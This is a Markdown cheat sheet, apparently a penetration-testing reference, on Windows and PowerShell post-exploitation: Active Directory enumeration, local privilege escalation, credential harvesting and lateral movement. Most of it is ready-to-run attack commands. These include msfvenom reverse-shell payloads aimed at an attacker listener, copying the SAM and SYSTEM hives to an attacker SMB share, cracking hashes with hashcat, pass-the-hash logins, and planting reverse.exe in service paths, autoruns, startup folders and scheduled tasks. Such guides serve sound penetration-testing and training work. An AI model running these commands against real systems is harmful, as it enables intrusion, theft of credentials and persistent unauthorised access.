# Powershell post exploitation

## Summary

- [Powershell post exploitation](#powershell-post-exploitation)
  - [Summary](#summary)
  - [Enumeration](#enumeration)
  - [Access Directory](#access-directory)
  - [Tools](#tools)
  - [Privilege Escalation](#privilege-escalation)
    - [Common commands to use](#common-commands-to-use)
    - [Unattended passwords](#unattended-passwords)
    - [Kernel Exploits](#kernel-exploits)
    - [Applications and Drivers Exploits](#applications-and-drivers-exploits)
    - [Insecure File or Folder Permissions](#insecure-file-or-folder-permissions)
    - [Unquoted Service Path](#unquoted-service-path)
    - [Always Install Elevated](#always-install-elevated)
    - [Insecure Service Permissions](#insecure-service-permissions)
    - [Insecure Registry Permissions](#insecure-registry-permissions)
    - [Weak Registry Permissions](#weak-registry-permissions)
    - [Insecure Service Executables](#insecure-service-executables)
    - [Token Manipulation](#token-manipulation)
    - [Potatoes](#potatoes)
      - [Hot Potatoe](#hot-potatoe)
      - [Rotten Potatoe](#rotten-potatoe)
      - [Juicy Potato](#juicy-potato)
    - [Autologon User Credentials](#autologon-user-credentials)
    - [Autoruns](#autoruns)
    - [AlwaysInstallElevated](#alwaysInstallElevated)
    - [Passwords Registry](#passwords-registry)
    - [Saved Creds](#saved-creds)
    - [Security Account Manager](#security-account-manager)
    - [Pass the Hash](#pass-the-hash)
    - [Scheduled Tasks](#scheduled-tasks)
    - [Insecure GUI Apps](#insecure-gui-apps)
    - [Startup Apps](#startup-apps)
    - [DLL Hijacking](#dll-hijacking)
    - [Security Account Manager Passwords](#security-account-manager-passwords)
  - [Lateral movement](#lateral-movement)
    - [Powershell Remoting](#powershell-remoting)
    - [Remote Code Execution with PS Credentials](#remote-code-execution-with-ps-credentials)
    - [Import a powershell module and execute its functions remotely](#import-a-powershell-module-and-execute-its-functions-remotely)
    - [Executing Remote Stateful commands](#executing-remote-stateful-commands)
  - [Tools](#tools)
- [Credits](#credits)

## Enumeration

Get Current Domain: `Get-Domain`
Enumerate Other Domains: `Get-Domain -Domain <DomainName>`
Get Domain SID: `Get-DomainSID`

Get Domain Policy: 

`Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess`
`Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy`

Domain controllers:

`Get-DomainController`
`Get-DomainController -Domain <DomainName>`

Enumerate Domain Users

```
#Save all Domain Users to a file
Get-DomainUser | Out-File -FilePath .\DomainUsers.txt

#Will return specific properties of a specific user
Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List

#Enumerate user logged on a machine
Get-NetLoggedon -ComputerName <ComputerName>

#Enumerate Session Information for a machine
Get-NetSession -ComputerName <ComputerName>

#Enumerate domain machines of the current/specified domain where specific users are logged into
Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
```

Enumerate Domain Computers

```
Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName

#Enumerate Live machines 
Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
```

Enumerate Groups and group members

```
#Save all Domain Groups to a file:
Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt

#Return members of Specific Group (eg. Domain Admins & Enterprise Admins)
Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member 
Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName

#Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine
Get-NetLocalGroup | Select-Object GroupName

#Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine
Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain

#Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
```

Enumerate Shares

```
#Enumerate Domain Shares
Find-DomainShare

#Enumerate Domain Shares the current user has access
Find-DomainShare -CheckShareAccess

#Enumerate "Interesting" Files on accessible shares
Find-InterestingDomainShareFile -Include *passwords*
```

Enumerate Group Policies

```
Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName

#Enumerate all GPOs to a specific computer
Get-DomainGPO -ComputerIdentity <ComputerName> -Properties DisplayName | Sort-Object -Property DisplayName

#Get users that are part of a Machine's local Admin group
Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>
```

Enumerate OUs

```
Get-DomainOU -Properties Name | Sort-Object -Property Name
```

Enumerate ACLs

```
# Returns the ACLs associated with the specified account
Get-DomaiObjectAcl -Identity <AccountName> -ResolveGUIDs

#Search for interesting ACEs
Find-InterestingDomainAcl -ResolveGUIDs

#Check the ACLs associated with a specified path (e.g smb share)
Get-PathAcl -Path "\\Path\Of\A\Share"
```

Enumerate Domain Trust

```
Get-DomainTrust
Get-DomainTrust -Domain <DomainName>

#Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds
Get-DomainTrustMapping
```

Enumerate Forest Trust

```
Get-ForestDomain
Get-ForestDomain -Forest <ForestName>

#Map the Trust of the Forest
Get-ForestTrust
Get-ForestTrust -Forest <ForestName>
```

User Hunting

```
#Finds all machines on the current domain where the current user has local admin access
Find-LocalAdminAccess -Verbose

#Find local admins on all machines of the domain
Find-DomainLocalGroupMember -Verbose

#Find computers were a Domain Admin OR a spesified user has a session
Find-DomainUserLocation | Select-Object UserName, SessionFromName

#Confirming admin access
Test-AdminAccess
```

### Access Directory

Get Current Domain: `Get-ADDomain`
Enum Other Domains: `Get-ADDomain -Identity <Domain>`
Get Domain SID: `Get-DomainSID`

Get Domain Controllers

```
Get-ADDomainController
Get-ADDomainController -Identity <DomainName>
```

Enumerate Domain Users

```
Get-ADUser -Filter * -Identity <user> -Properties *

#Get a spesific "string" on a user's attribute
Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
```

Enumerate Domain Computers

```
Get-ADComputer -Filter * -Properties *
Get-ADGroup -Filter * 
```

Enumerate Domain Trust

```
Get-ADTrust -Filter *
Get-ADTrust -Identity <DomainName>
```

Enumerate Forest Trust

```
Get-ADTrust -Filter *
Get-ADTrust -Identity <DomainName>
```

Enumerate Local Applocker Effective Policy `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

### Tools

[LDAP](https://github.com/dirkjanm/ldapdomaindump)
[AD](https://github.com/sense-of-security/ADRecon)
[DNS](https://github.com/dirkjanm/adidnsdump)
[Privilege Account Hunt](https://github.com/cyberark/ACLight)

## Privilege Escalation

### Common commands to use
`systeminfo`
`WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors`
`whoami `
`whoami /priv`
`Lookout for`

- SeDebugPrivilege
- SeRestorePrivilege
- SeBackupPrivilege
- SeTakeOwnershipPrivilege
- SeTcbPrivilege
- SeCreateToken Privilege
- SeLoadDriver Privilege
- SeImpersonate & SeAssignPrimaryToken Priv.

`whoami /groups`

`net user`

`netstat -ano`

`ipconfig /all`

`route print`

`tasklist /SVC > tasks.txt`

`schtasks /query /fo LIST /v > schedule.txt`

`netsh advfirewall show currentprofile`

`netsh advfirewall firewall show rule name=all`

`wmic product get name, version, vendor > apps_versions.txt`

`DRIVERQUERY`

`mountvol`

`accesschk.exe /accepteula`

`accesschk.exe -uws "Everyone" "C:\Program Files"`

`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`

`reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`

Stored Credentials

If system is running an IIS web server the web.config file:

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
`C:\inetpub\wwwroot\web.config`

Local administrators passwords can also retrieved via the Group Policy Preferences:

`C:\ProgramData\Microsoft\Group Policy\History????\Machine\Preferences\Groups\Groups.xml`

`????\SYSVOL\Policies????\MACHINE\Preferences\Groups\Groups.xml`

Except of the Group.xml file, the password attribute can be found in other policy preference files as well such as:

`Services\Services.xml`
`ScheduledTasks\ScheduledTasks.xml`
`Printers\Printers.xml`
`Drives\Drives.xml`
`DataSources\DataSources.xml`

Most Windows systems they are running McAfee as their endpoint protection. The password is stored encrypted in the SiteList.xml file:

`%AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml`


### Unattended passwords


Unattended Installs allow for the deployment of Windows with little-to-no active involvement from an administrator. This solution is ideal in larger organizations where it would be too labor and time-intensive to perform wide-scale deployments manually. If administrators fail to clean up after this process, an EXtensible Markup Language (XML) file called Unattend is left on the local system. This file contains all the configuration settings that were set during the installation process, some of which can include the configuration of local accounts, to include Administrator accounts!

While it’s a good idea to search the entire drive, Unattend files are likely to be found within the following folders:

`C:\unattend.xml`
`C:\Windows\Panther\Unattend.xml`
`C:\Windows\Panther\Unattend\Unattend.xml`
`C:\Windows\system32\sysprep.inf`
`C:\Windows\system32\sysprep\sysprep.xml`

`If you find one, open it and search for tag. Stored as plaintext or base64.`

### Kernel Exploits

WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors

Use [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)

### Applications and Drivers Exploits

wmic product get name, version, vendor > install_apps.txt

powershell: driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', 'Path'

Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "VMware"}

driverquery /v > drivers.txt

### Insecure File or Folder Permissions

Always use https://download.sysinternals.com/files/AccessChk.zip to check the permissions.

Search for world writable files and directories:

`accesschk.exe -uws "Everyone" "C:\Program Files"`

`powershell: Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}`

Find running proccess:

`tasklist /SVC > tasks.txt`

`powershell: Get-WmiObject win32_service | Select-Object Name, State, PathName| Where-Object {$_.State -like 'Running'}`

### Unquoted Service Path

This happens when the binary doesn't have the quotes properly placed.
Discover all the services that are running on the target host and identify those that are not enclosed inside quotes:

`wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\"`

The next step is to try to identify the level of privilege that this service is running. This can be identified easily:

```powershell
$ sc qc unquotedsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe   <---------
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

In this case Windows will try every possible executable in this path:

C:\Program.exe
C:\Program Files.exe
C:\Program Files\Unquoted.exe 

Copying the file and starting the service

```powershell
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
net start unquotedsvc
```

### Always Install Elevated

If they return output then vulnerability exists:

`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`
`reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

### Insecure Service Permissions

Services are simply programs that run in the background, accepting input or performing regular tasks. If services run with SYSTEM privileges and are misconfigured, exploiting them may lead to command execution with SYSTEM privileges as well.

1. Insecure Service Properties
2. Unquoted Service Path
3. Weak Registry Permissions
4. Insecure Service Executables
5. DLL Hijacking

> If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own.

> “Potential Rabbit Hole: If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!”

Detect is to find a service with weak permissions

`accesschk.exe -uwcqv *`

For Shorten output

`accesschk.exe -uwcqv "Authenticated Users" *`

`accesschk.exe -uwcqv "Everyone" *`

The output will be the service name, the group name and the permissions that group has. Anything like SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS is a win. In fact any of the following permissions are worth looking out for:

`SERVICE_CHANGE_CONFIG`

`SERVICE_ALL_ACCESS`

`GENERIC_WRITE`

`GENERIC_ALL`

`WRITE_DAC`

`WRITE_OWNER`

If you have reconfiguration permissions, or can get them through the above permission list, then you can use the SC command to exploit the vulnerability:

```powershell
sc config SERVICE binpath= "\"PATH OF OUR REVERSE SHELL\""

or adding out own user

sc config daclsvc binpath= "net localgroup administrators user /add"
```

To check if we where added to the admin group

`net localgroup administrators`

`net stop SERVICENAME`

`net start SERVICENAME`

Stop and start the service again and you’re a Local Admin!

### Insecure Registry Permissions

Windows stores all the necessary data that is related to services in the registry key location below:

`reg query HKLM\SYSTEM\CurrentControlSet\Services`
 
If you find a vulnerable service use the follwing command to see its details:

`req query HKLM\SYSTEM\CurrentControlSet\Services\<servicename>`

Find from which group is accessible this service

`accesschk.exe /accepteula -uvwqk hklm\System\CurrentControleSet\Service\<servicename>`

Found if note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users).

generate a payload:

`msfvenom –p windows/exec CMD=<Command> -f exe-services –o <service binary>`

Open a listener

Overweight the imagepath subkey of the valuable services with the path of the custom binary

`reg add HKLM\System\CurrentControleSet\Service<Service nam> /v ImagePath /t REG_EXPAND_SZ /d <path_to_exe> /f`

start service:

`net start`

### Weak Registry Permissions

> The Windows registry stores entries for each service.
Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the service directly.

> To exploit this we have two possible ways, one we can remove the existing exe file and replace with our rev.exe to get reverse shell and two we have to modify the registry path itself to our rev.exe file.


Check the directory permissions

```powershell
.\accesschk.exe /accepteula -dvwq "C:\program files\insecure registry service\"
```

Check services permissions

```powershell
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc

or

Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```

To check ALL registries, we can do:

```powershell
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services
```

Change registry imagepath

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

```powershell
sc start regsvc
```

### Insecure Service Executables


In case we have  READ/WRITE permission over the folder of the service, we can simply do:

```powershell
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

To be root

### Token Manipulation

whoami /priv

- SeDebugPrivilege
- SeRestorePrivilege
- SeBackupPrivilege
- SeTakeOwnershipPrivilege
- SeTcbPrivilege
- SeCreateToken Privilege
- SeLoadDriver Privilege
- SeImpersonate & SeAssignPrimaryToken Priv.

### Potatoes

If the machine is >= Windows 10 1809 & Windows Server 2019 — Try Rogue Potato
If the machine is < Windows 10 1809 < Windows Server 2019 — Try Juicy Potato

This can only be done if current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.

You can verify if you have privilege to impersonate security tokens

```powershell
whoami /priv
```

If we have `SeImpersonatePrivileges` or `SeAssignPrimaryTokenPrivileges` enabled, we can be root.

Note: *PsExec is a command-line tool that lets you execute processes on remote systems and redirect console applications’ output to the local system so that these applications appear to be running locally.*

Potatoes list:

- Hot
- Rotten
- Lonely
- Juicy
- Rogue


#### Hot Potatoe

Takes advantage of known issues in Windows to gain local privilege escalation in default configurations, namely NTLM relay (specifically HTTP->SMB relay) and NBNS spoofing.

Affected systems: `Windows 7,8,10, Server 2008, Server 2012`
Guide: https://foxglovesecurity.com/2016/01/16/hot-potato/
Usage: https://github.com/foxglovesec/Potato

#### Rotten Potatoe

Rotten Potato and its standalone variants leverages the privilege escalation chain based on BITS service having the MiTM listener on 127.0.0.1:6666 and when you have SeImpersonate or SeAssignPrimaryToken privileges

Affected systems: `Windows 7,8,10, Server 2008, Server 2012, Server 2016`
Guide: 
- https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
- https://0xdf.gitlab.io/2018/08/04/htb-silo.html

Usage: https://github.com/nickvourd/lonelypotato

`Rotten Potato from default opens meterpreter, use lonely potato which opens in line shell`

#### Juicy Potato

What is: Juicy potato is basically a weaponized version of the RottenPotato exploit that exploits the way Microsoft handles tokens. Through this, we achieve privilege escalation.

Affetcted Systems:
- Windows 7 Enterprise
- Windows 8.1 Enterprise
- Windows 10 Enterprise
- Windows 10 Professional
- Windows Server 2008 R2 Enterprise
- Windows Server 2012 Datacenter
- Windows Server 2016 Standard

Find CLSID here: https://ohpe.it/juicy-potato/CLSID/

`Warning: Juicy Potato doesn’t work in Windows Server 2019`

Guides:

https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/#juicy-potato-abusing-the-golden-privileges

https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato#:~:text=Juicy%20potato%20is%20basically%20a,this%2C%20we%20achieve%20privilege%20escalation.

Usage: https://github.com/ohpe/juicy-potato

### Autologon User Credentials

Use the following command and if return output take autologon user credentials from registy:

`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"`

### Autoruns

> Windows can be configured to run commands at startup, with elevated privileges. These “AutoRuns” are configured in the Registry. If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges.

Find auto run executables:

`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:

`accesschk.exe /accepteula -wvu "\<path>\<file.exe>"`

copy a shell to auto run executable:

`copy <path>\<file.exe> "\<path>\<file.exe>" /Y`

Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it.

`rdesktop <ip>`

### AlwaysInstallElevated

> MSI files are package files used to install applications. These files run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file which contains a reverse shell.

> "The catch is that two Registry settings must be enabled for this to work.
The “AlwaysInstallElevated” value must be set to 1 for both the local machine:
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
and the current user: HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
If either of these are missing or disabled, the exploit will not work.

Check if you have the permissions

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer 
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer 
```

Creating the payload

```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
```

Installing the reverse shell

```powershell
msiexec /quiet /qn /i PATH_OF_THE_MSI
```

### Passwords Registry


> Even administrators re-use their passwords, or leave their passwords on systems in readable locations. Windows can be especially vulnerable to this, as several features of Windows store passwords insecurely.

> Registry — Plenty of programs store configuration options in the Windows Registry. Windows itself sometimes will store passwords in plaintext in the Registry. It is always worth searching the Registry for passwords.

The registry can be searched for keys and values that contain the word "password":

`reg query HKLM /f password /t REG_SZ /s`

If you want to save some time, query this specific key to find admin AutoLogon credentials:

`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`

On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):

`winexe -U 'admin%password' //ip_of_victim cmd.exe`

Registry lookup by string `password`

```powershell
reg query HKLM /f password /t REG_SZ /s
```

admin AutoLogon credentials

```powershell
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

And login

```powershell
winexe -U 'admin%password' //10.10.93.139 cmd.exe
```

### Saved Creds

> Windows has a runas command which allows users to run commands with the privileges of other users. This usually requires the knowledge of the other user’s password. However, Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement.


To list the vaults

```powershell
cmdkey /list
``` 

To run command as another user

```powershell
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

### Security Account Manager


> Windows stores password hashes in the Security Account Manager (SAM). The hashes are encrypted with a key which can be found in a file named SYSTEM. If you have the ability to read the SAM and SYSTEM files, you can extract the hashes

> The SAM and SYSTEM files are located in the C:\Windows\System32\config directory.
The files are locked while Windows is running.
Backups of the files may exist in the `C:\Windows\Repair` or `C:\Windows\System32\config\RegBack` directories


Start the SAMBA listener in your machine

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

Copy the SAM files

```powershell
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
```

Crack the SAM files

```bash
git clone https://github.com/Neohapsis/creddump7.git
python2 creddump7/pwdump.py SYSTEM SAM

hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```

### Pass the Hash

> Windows accepts hashes instead of passwords to authenticate to a number of services. We can use a modified version of winexe, pth-winexe to spawn a command prompt using the admin user’s hash.


```bash
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.93.139 cmd.exe
```

### Scheduled Tasks

> Windows can be configured to run tasks at specific times, periodically (e.g. every 5 mins) or when triggered by some event (e.g. a user logon). Tasks usually run with the privileges of the user who created them, however administrators can configure tasks to run as other users, including SYSTEM.


List all scheduled tasks our user can see.


```powershell
schtasks /query /fo LIST /v

Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

Check the privileges

```powershell
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```

Write our payload into the script

```powershell
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

### Insecure GUI Apps

> On some (older) versions of Windows, users could be granted the permission to run certain GUI apps with administrator privileges. There are often numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality. Since the parent process is running with administrator privileges, the spawned command prompt will also run with these privileges.

> We call this the “Citrix Method” because it uses many of the same techniques used to break out of Citrix environments.

List all the processes

```powershell
tasklist /V | findstr mspaint.exe
``` 

Get the cmd shell

```powershell
file://c:/windows/system32/cmd.exe
``` 

### Startup Apps

> Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory. Windows also has a startup directory for apps that should start for all users: `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.


Check if we have permissions, if BUILTIN\Users have write access, then we can become root

```powershell
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

or

icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

Powershell script to create a startup executable

```powershell
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```

Now we need for the admin to login into the account


### DLL Hijacking


We can use procmon from systernals to find missing dlls

In case you found something, go to https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking to continue the exploit.

### Security Account Manager Passwords

Transfer the SAM and SYSTEM files to your Kali VM:

`copy C:\Windows\Repair\SAM \ip\kali\`
`copy C:\Windows\Repair\SYSTEM \ip\kali\`

On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:

`git clone https://github.com/Neohapsis/creddump7.git`
`sudo apt install python-crypto`
`python2 creddump7/pwdump.py SYSTEM SAM`

Crack the admin NTLM hash using hashcat:

`hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`

## Lateral movement

### Powershell Remoting

```
#Enable Powershell Remoting on current Machine (Needs Admin Access)
Enable-PSRemoting

#Entering or Starting a new PSSession (Needs Admin Access)
$sess = New-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
```

### Remote Code Execution with PS Credentials

```
$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
```

### Import a powershell module and execute its functions remotely

```
#Execute the command and start a session
Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess 

#Interact with the session
Enter-PSSession -Session $sess
```

### Executing Remote Stateful commands

```
#Create a new session
$sess = New-PSSession -ComputerName <NameOfComputer>

#Execute command on the session
Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}

#Check the result of the command to confirm we have an interactive session
Invoke-Command -Session $sess -ScriptBlock {$ps}
```


### Tools


[PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) Misconfiguration Abuse
[BeRoot](https://github.com/AlessandroZ/BeRoot) General Priv Esc Enumeration Tool
[Privesc](https://github.com/enjoiz/Privesc) General Priv Esc Enumeration Tool
[FullPowers](https://github.com/itm4n/FullPowers) Restore A Service Account's Privileges
- winPEASany.exe
- Seatbelt.exe
- SharpUp.exe

# Credits

https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#readme

https://github.com/nickvourd/Windows_Privilege_Escalation_CheatSheet
















































































